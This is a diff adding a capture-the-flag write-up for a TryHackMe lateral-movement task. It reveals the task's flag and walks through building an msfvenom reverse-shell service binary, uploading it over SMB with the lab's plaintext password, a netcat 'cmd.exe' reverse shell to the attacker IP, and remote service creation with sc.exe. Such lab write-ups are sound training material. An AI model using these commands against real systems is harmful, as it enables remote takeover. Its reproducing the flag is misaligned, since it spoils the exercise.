@@ -306,6 +306,57 @@ Once you have started the service, you should receive a connection in your Attac
 
 * After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?
 
+    `THM{MOVING_WITH_SERVICES}`
+
+    * Connect to THMJMP2 via SSH
+    
+        `ssh t1_leonard.summers@za.tryhackme.com@thmjmp2.za.tryhackme.com`
+
+        ![task3-ssh](./images/task3-ssh.png)
+
+    * Create Payload
+    
+        `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.49.31 LPORT=4444 -o myservice.exe`
+
+        ![task3-create-payload](./images/task3-create-payload.png)
+
+    * Upload Payload
+    
+        `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`
+
+        ![task3-upload-payload](./images/task3-upload-payload.png)
+
+    * Running msfconsole
+    
+        `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"`
+
+        ![task3-handler](./images/task3-handler.png)
+
+    * Setup listener
+    
+        `nc -nvlp 5555`
+
+        ![task3-listener](./images/task3-listener.png)
+
+    * Running sc.exe with admin credential
+    
+        `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.49.31 5555"`
+
+        ![task3-runas](./images/task3-runas.png)
+
+    * Proceed to create a new service remotely by using sc, associating it with our uploaded binary
+    
+        ```
+        sc.exe \\thmiis.za.tryhackme.com create THMservice-kakakseram binPath= "%windir%\myservice.exe" start= auto
+        sc.exe \\thmiis.za.tryhackme.com start THMservice-kakakseram
+        ```
+
+        ![task3-sc](./images/task3-sc.png)
+
+    * Get the flag
+    
+        ![task3-flag](./images/task3-flag.png)
+
 ## Task 4 - Moving Laterally Using WMI
 
 We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI). WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. 
